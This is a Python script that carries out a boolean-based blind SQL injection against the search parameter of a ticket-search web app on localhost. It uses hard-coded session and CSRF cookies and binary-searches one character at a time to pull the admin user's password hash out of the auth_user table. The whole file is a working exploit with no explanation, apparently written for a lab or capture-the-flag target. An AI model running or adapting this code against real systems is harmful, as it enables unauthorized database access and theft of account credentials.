import requests
import string

BASE_URL = "http://127.0.0.1:5001/tickets/search/"

COOKIES = {
    "sessionid": "eys93ga5nohuan4p8tmhbl0cyz9m604x",
    "csrftoken": "I4vXvUic94DORL0Hb82WERd523Uc1RyL",
}

def oracle(condition_sql):
    """
    Sends a boolean SQLi payload and returns True if the condition
    was TRUE (search matched something), False if it was FALSE
    (page shows 'No matches.').
    """
    payload = f"' AND ({condition_sql})--"
    params = {"q": payload}
    resp = requests.get(BASE_URL, params=params, cookies=COOKIES)
    return "No matches." not in resp.text

def get_length(subquery):
    """Binary search the length of whatever subquery returns."""
    low, high = 0, 200  # generous upper bound
    while low < high:
        mid = (low + high) // 2
        cond = f"(SELECT length({subquery})) > {mid}"
        if oracle(cond):
            low = mid + 1
        else:
            high = mid
    return low

def get_char(subquery, position):
    """Binary search the ASCII value of one character via substring()."""
    low, high = 32, 126  # printable ASCII range
    while low < high:
        mid = (low + high) // 2
        cond = f"(SELECT ascii(substring({subquery},{position},1))) > {mid}"
        if oracle(cond):
            low = mid + 1
        else:
            high = mid
    return chr(low)

def extract_string(subquery):
    length = get_length(subquery)
    print(f"[+] Length: {length}")
    result = ""
    for pos in range(1, length + 1):
        c = get_char(subquery, pos)
        result += c
        print(f"[+] Position {pos}: '{c}'  -> so far: {result}")
    return result

if __name__ == "__main__":
    subquery = "(SELECT password FROM auth_user WHERE username='admin')"
    hash_value = extract_string(subquery)
    print("\n RECOVERED HASH:")
    print(hash_value)